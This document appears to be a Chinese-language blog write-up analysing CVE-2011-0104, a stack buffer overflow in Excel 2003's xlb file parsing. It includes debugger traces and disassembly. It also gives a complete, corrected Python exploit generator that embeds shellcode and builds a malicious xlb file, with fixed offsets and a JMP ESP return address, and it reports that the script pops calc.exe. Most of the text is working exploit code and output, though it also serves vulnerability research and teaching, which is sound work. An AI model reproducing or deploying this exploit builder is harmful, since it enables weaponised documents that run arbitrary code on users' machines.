# CVE-2011-0104 Excel栈溢出分析利用

## 前言

`CVE-2011-0104`是`Microsoft Excel`在解析`xlb`文件时引发的栈溢出漏洞，构造恶意的文件可造成任意命令执行。

## 环境

系统: windows XP SP3  
office版本：2003 11.5612.5606

## poc

由`abysssec`给出的`exp`生成代码如下:

```
#http://www.abysssec.com/blog/2011/11/02/microsoft-excel-2007-sp2-buffer-overwrite-vulnerability-ba-exploit-ms11-021/
import sys

def main():
   
    try:
		fdR = open('src.xlb', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:1556]
		str2 = strTotal[2385:]
		
		recordType = "\xA7\x00"
		recordLenght = "\x04\x00"
		field1 = "\xB0"
		field2 = "\x0F\x0C"
		field3 = "\x00"
		field4 = "\x3C\x00"
		field5 = "\x00\x03"
		
		record = recordType + recordLenght + field1 + field2 + field3 + field4 + field5
		
		eip = "\xDF\xD6\xD5\x3B"    # Call ESP
		
		# shellcode calc.exe
		shellcode = ...
				
		if len(shellcode) > 800:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 800:
			dif = 800 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
				
		fdW= open('exploit.xlb', 'wb+')
		fdW.write(str1)
		fdW.write(record)    
		fdW.write("\x41")     # pad
		fdW.write(eip)				
		fdW.write("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")      # bypassing a conditional
		fdW.write(shellcode)
		fdW.write(str2)
		
		fdW.close()
		fdR.close()
		print '[-] Excel file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()
```

这里先把`shellcode`设为800个`\x41`来进行调试。

## 调试分析

打开`Excel`，附加到`windbg`，加载`poc.xlb`，文件，一段时间后发生了崩溃:

```
eax=41414141 ebx=00000002 ecx=00000006 edx=3160ff00 esi=00000000 edi=00000400
eip=300ce361 esp=0013d8b0 ebp=0013d918 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
EXCEL!Ordinal41+0xce361:
300ce361 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
0:000> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
0013d918 41414141 EXCEL!Ordinal41+0xce361
0013d91c 41414141 0x41414141
0013d920 41414141 0x41414141
0013d924 41414141 0x41414141
0013d928 41414141 0x41414141
```

`eax`变成了我们设置的`\x41`，由于这个地址不可写而造成了错误，通过栈回溯发现栈空间被`\x41`填满了，应该是之前的指令造成了溢出覆盖了某个变量导致了这里的异常。

用`IDA`加载`excel.exe`，定位到异常发生的指令所在函数为`sub_300CE252`，在`300CE252`上下断点用`immunity debugger`调试，断下来后在栈顶设置硬件写入断点，然后运行，程序会断在:

```
300CE3C8   . F3:A5          REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]
```

在`IDA`查找这个地址，得到属于`sub_300CE380`，汇编代码如下:

```
0:003> u 300CE380 L30
EXCEL!Ordinal41+0xce380:
300ce380 53              push    ebx
300ce381 8b5c240c        mov     ebx,dword ptr [esp+0Ch] // 字节数，来源于第二个参数
300ce385 85db            test    ebx,ebx
300ce387 0f8409770100    je      EXCEL!Ordinal41+0xe5a96 (300e5a96)
300ce38d 3b5c2410        cmp     ebx,dword ptr [esp+10h]
300ce391 0f87ecbb1400    ja      EXCEL!Ordinal41+0x219f83 (30219f83)
300ce397 8b1508148630    mov     edx,dword ptr [EXCEL!DllGetLCID+0x10bda (30861408)]
300ce39d a1f8d38530      mov     eax,dword ptr [EXCEL!DllGetLCID+0xcbca (3085d3f8)]
300ce3a2 55              push    ebp
300ce3a3 8b6c240c        mov     ebp,dword ptr [esp+0Ch]
300ce3a7 56              push    esi
300ce3a8 57              push    edi
300ce3a9 3bd0            cmp     edx,eax
300ce3ab 0f8ddf980200    jge     EXCEL!Ordinal41+0xf7c90 (300f7c90)
300ce3b1 2bc2            sub     eax,edx
300ce3b3 3bd8            cmp     ebx,eax
300ce3b5 7d02            jge     EXCEL!Ordinal41+0xce3b9 (300ce3b9)
300ce3b7 8bc3            mov     eax,ebx
300ce3b9 8db200d48530    lea     esi,EXCEL!DllGetLCID+0xcbd2 (3085d400)[edx]
300ce3bf 8bc8            mov     ecx,eax
300ce3c1 8bd1            mov     edx,ecx
300ce3c3 c1e902          shr     ecx,2  // 要复制的字节数除以4，得到dword数
300ce3c6 8bfd            mov     edi,ebp
300ce3c8 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

由此得出要复制的字节数来源于第二个参数，复制的目的地址是`ebp`，而来源数据的地址为`[edx]`，`edx`的来源是一个本地变量。

在`300ce380`下断点调试，在第二次断在断点处时单步跟踪:

```
0:000> p
eax=ffffefe1 ebx=000000ff ecx=ffffcfc1 edx=00003f79 esi=0013b0e3 edi=0000303c
eip=300ce381 esp=00138090 ebp=0013a180 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
EXCEL!Ordinal41+0xce381:
300ce381 8b5c240c        mov     ebx,dword ptr [esp+0Ch] ss:0023:0013809c=00030000
0:000> dd esp
00138090  000000ff 306df0e1 0013b0e3 00000300
001380a0  ffffefe1 000c0fb0 90909041 90909090
001380b0  90909090 90909090 90909090 90909090
001380c0  90909090 90909090 90909090 90909090
001380d0  90909090 90909090 90909090 90909090
001380e0  90909090 90909090 90909090 90909090
001380f0  90909090 90909090 90909090 90909090
00138100  90909090 90909090 90909090 90909090
0:000> p
eax=ffffefe1 ebx=00000300 ecx=ffffcfc1 edx=00003f79 esi=0013b0e3 edi=0000303c
eip=300ce385 esp=00138090 ebp=0013a180 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
EXCEL!Ordinal41+0xce385:
300ce385 85db            test    ebx,ebx
```

这里`ebx`的值变为了`0x300`。

```
0:000> 
eax=00000300 ebx=00000300 ecx=000000c0 edx=00000300 esi=3085d420 edi=0000303c
eip=300ce3c6 esp=00138084 ebp=0013b0e3 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
EXCEL!Ordinal41+0xce3c6:
300ce3c6 8bfd            mov     edi,ebp
0:000> 
eax=00000300 ebx=00000300 ecx=000000c0 edx=00000300 esi=3085d420 edi=0013b0e3
eip=300ce3c8 esp=00138084 ebp=0013b0e3 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
EXCEL!Ordinal41+0xce3c8:
300ce3c8 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
```

看到目的地址为`0013b0e3`，源地址为`3085d420`。

应该是`ebx`的值过大导致的溢出，这里的`0x300`就是脚本中的`field5 = "\x00\x03"`，在`immunity debugger`中查看这个函数调用栈，看到`Arg1`就是缓冲区，`Arg2`就是复制大小。

```
Address    Returns to    Procedure / arguments
00138094   306DF0E1      EXCEL.300CE380
00138098   0013B0E3        Arg1 = 0013B0E3
0013809C   00000300        Arg2 = 00000300
001380A0   FFFFEFE1        Arg3 = FFFFEFE1
```

函数返回到`306DF0E1`，查看一下函数是这样被调用的:

```
0:000> ub 306DF0E1 L30
EXCEL!MdCallBack+0x28001e:
306df036 895570          mov     dword ptr [ebp+70h],edx
306df039 0f8eb90a0000    jle     EXCEL!MdCallBack+0x280ae0 (306dfaf8)
306df03f bbff000000      mov     ebx,0FFh
306df044 ff4d60          dec     dword ptr [ebp+60h]
306df047 8b8580000000    mov     eax,dword ptr [ebp+80h]
306df04d 833da01c863005  cmp     dword ptr [EXCEL!DllGetLCID+0x11472 (30861ca0)],5
306df054 8b7d64          mov     edi,dword ptr [ebp+64h]
306df057 7d13            jge     EXCEL!MdCallBack+0x280054 (306df06c)
306df059 660fb608        movzx   cx,byte ptr [eax]
306df05d 66894d78        mov     word ptr [ebp+78h],cx
306df061 660fb64801      movzx   cx,byte ptr [eax+1]
306df066 66894d7a        mov     word ptr [ebp+7Ah],cx
306df06a eb05            jmp     EXCEL!MdCallBack+0x280059 (306df071)
306df06c 8b08            mov     ecx,dword ptr [eax]
306df06e 894d78          mov     dword ptr [ebp+78h],ecx
306df071 66837d7800      cmp     word ptr [ebp+78h],0
306df076 751f            jne     EXCEL!MdCallBack+0x28007f (306df097)
306df078 034570          add     eax,dword ptr [ebp+70h]
306df07b 668b4d60        mov     cx,word ptr [ebp+60h]
306df07f ff4d60          dec     dword ptr [ebp+60h]
306df082 6685c9          test    cx,cx
306df085 c7456401000000  mov     dword ptr [ebp+64h],1
306df08c 898580000000    mov     dword ptr [ebp+80h],eax
306df092 75b9            jne     EXCEL!MdCallBack+0x280035 (306df04d)
306df094 8b7d64          mov     edi,dword ptr [ebp+64h]
306df097 66f7457a2f01    test    word ptr [ebp+7Ah],12Fh
306df09d 746c            je      EXCEL!MdCallBack+0x2800f3 (306df10b)
306df09f 3b7574          cmp     esi,dword ptr [ebp+74h]
306df0a2 7267            jb      EXCEL!MdCallBack+0x2800f3 (306df10b)
306df0a4 e859f39eff      call    EXCEL!Ordinal41+0xce402 (300ce402)
306df0a9 83f83c          cmp     eax,3Ch
306df0ac 89456c          mov     dword ptr [ebp+6Ch],eax
306df0af 0f85be0a0000    jne     EXCEL!MdCallBack+0x280b5b (306dfb73)
306df0b5 e848f39eff      call    EXCEL!Ordinal41+0xce402 (300ce402)
306df0ba 8b7d38          mov     edi,dword ptr [ebp+38h]
306df0bd 0faf7d70        imul    edi,dword ptr [ebp+70h]
306df0c1 894574          mov     dword ptr [ebp+74h],eax
306df0c4 8b4568          mov     eax,dword ptr [ebp+68h]
306df0c7 8d740703        lea     esi,[edi+eax+3]
306df0cb e8dbea9cff      call    EXCEL!Ordinal41+0xadbab (300adbab)
306df0d0 6afd            push    0FFFFFFFDh
306df0d2 59              pop     ecx
306df0d3 2bcf            sub     ecx,edi
306df0d5 03c1            add     eax,ecx
306df0d7 50              push    eax
306df0d8 ff7574          push    dword ptr [ebp+74h]
306df0db 56              push    esi
306df0dc e89ff29eff      call    EXCEL!Ordinal41+0xce380 (300ce380)
```

可以看出`esi`为复制的目标地址，`[ebp+74h]`为复制的字节数，往前看`306df0c1`发现来自`eax`。

用`immunity debugger`附加调试，在`306df0b5`的`call`下断点，发现这个`call`返回的就是`0x300`，应该就是获取长度，然后放到`[ebp+70h]`，再作为参数传递给`300ce380`。

```
306DF0B5  |. E8 48F39EFF    ||CALL EXCEL.300CE402
306DF0BA  |. 8B7D 38        ||MOV EDI,DWORD PTR SS:[EBP+38]
306DF0BD  |. 0FAF7D 70      ||IMUL EDI,DWORD PTR SS:[EBP+70]
306DF0C1  |. 8945 74        ||MOV DWORD PTR SS:[EBP+74],EAX
306DF0C4  |. 8B45 68        ||MOV EAX,DWORD PTR SS:[EBP+68]
306DF0C7  |. 8D7407 03      ||LEA ESI,DWORD PTR DS:[EDI+EAX+3]
306DF0CB  |. E8 DBEA9CFF    ||CALL EXCEL.300ADBAB
306DF0D0  |. 6A FD          ||PUSH -3
306DF0D2  |. 59             ||POP ECX
306DF0D3  |. 2BCF           ||SUB ECX,EDI
306DF0D5  |. 03C1           ||ADD EAX,ECX
306DF0D7  |. 50             ||PUSH EAX
306DF0D8  |. FF75 74        ||PUSH DWORD PTR SS:[EBP+74]
306DF0DB  |. 56             ||PUSH ESI
306DF0DC  |. E8 9FF29EFF    ||CALL EXCEL.300CE380
```

这里既然复制的长度可控，那么就可以覆盖任意的返回地址。

## exp

用`abysssec`给出的`exp`并不能成功弹出计算器，会触发一个异常:

```
eax=51453844 ebx=00000002 ecx=00000006 edx=3160ff00 esi=00000000 edi=00000400
eip=300ce361 esp=0013b0cc ebp=0013b134 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
EXCEL!Ordinal41+0xce361:
300ce361 8908            mov     dword ptr [eax],ecx  ds:0023:51453844=????????
```

推测应该是shellcode覆盖了某个变量，导致了违规内存写入，这里`eax`的值是函数的一个参数:

```
300ce354 8b452c          mov     eax,dword ptr [ebp+2Ch]
300ce357 3bc6            cmp     eax,esi
300ce359 7408            je      EXCEL!Ordinal41+0xce363 (300ce363)
300ce35b 8b0da01c8630    mov     ecx,dword ptr [EXCEL!DllGetLCID+0x11472 (30861ca0)]
300ce361 8908            mov     dword ptr [eax],ecx
```

这次修改`poc.py`，把800个`\x41`换成唯一字符串，使用`pattern_create.rb`生成。

```
eax=41366441 ebx=00000002 ecx=00000006 edx=3160ff00 esi=00000000 edi=00000400
eip=300ce361 esp=0013b0cc ebp=0013b134 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
EXCEL!Ordinal41+0xce361:
300ce361 8908            mov     dword ptr [eax],ecx  ds:0023:41366441=????????
```

再用`pattern_offset`可得在偏移108处，需要在这里填入一个可写的地址，比如`30856000`。

作者给出的代码覆盖返回地址的偏移也不对，经过测试，在偏移68的位置可以控制`eip`:

```
eax=00000000 ebx=00000002 ecx=00000006 edx=3160ff00 esi=00000000 edi=0013b4f8
eip=42424242 esp=00139764 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
42424242 ??              ???
```

通过调试查看栈上的数据:

```
0013AA88  00000000  ....
0013AA8C  41414141  AAAA
0013AA90  42424242  BBBB
0013AA94  41414141  AAAA
0013AA98  41414141  AAAA
0013AA9C  41414141  AAAA
0013AAA0  41414141  AAAA
0013AAA4  41414141  AAAA
0013AAA8  41414141  AAAA
0013AAAC  41414141  AAAA
0013AAB0  41414141  AAAA
0013AAB4  41414141  AAAA
0013AAB8  30856000  .`?   EXCEL.30856000
0013AABC  41306141  Aa0A
0013AAC0  61413161  a1Aa
0013AAC4  33614132  2Aa3
0013AAC8  41346141  Aa4A
0013AACC  61413561  a5Aa
```

可写地址后面的数据没有被破坏，直接控制`eip`返回栈中执行再跳过垃圾数据即可。

`exp.py`:

```
import sys

def main():
   
    try:
		fdR = open('src.xlb', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:1556]
		str2 = strTotal[2385:]
		
		recordType = "\xA7\x00"
		recordLenght = "\x04\x00"
		field1 = "\xB0"
		field2 = "\x0F\x0C"
		field3 = "\x00"
		field4 = "\x3C\x00"
		field5 = "\x00\x03"
		
		record = recordType + recordLenght + field1 + field2 + field3 + field4 + field5
		
		eip = "\xDF\xD6\xD5\x3B"    # Call ESP
		
		# shellcode calc.exe
		shellcode = "A" * 68
		shellcode += "\x4f\x1b\x87\x30" # 30871B4F   FFE4             JMP ESP
		shellcode += "A" * (106 - len(shellcode))
		shellcode += "\xeb\x02" # jmp 4
		shellcode += "\x00\x60\x85\x30" # 30856000 write
		shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
		shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
		shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
		shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
		shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
		shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
		shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
		shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
		shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
		shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
		shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
		shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
		shellcode += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
		shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
		shellcode += "\xff\xd5\x63\x61\x6c\x63\x00"

		if len(shellcode) > 800:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 800:
			dif = 800 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
				
		fdW= open('poc.xlb', 'wb+')
		fdW.write(str1)
		fdW.write(record)    
		fdW.write("\x41")     # pad
		fdW.write(eip)				
		fdW.write("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")      # bypassing a conditional
		fdW.write(shellcode)
		fdW.write(str2)
		
		fdW.close()
		fdR.close()
		print '[-] Excel file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()
```

可以成功弹出计算器。

当然如果需要绕过`DEP`和`ASLR`可以构造`ROP`链。

## 总结

这个漏洞分析利用还是较为容易的，可能造成大面积的攻击。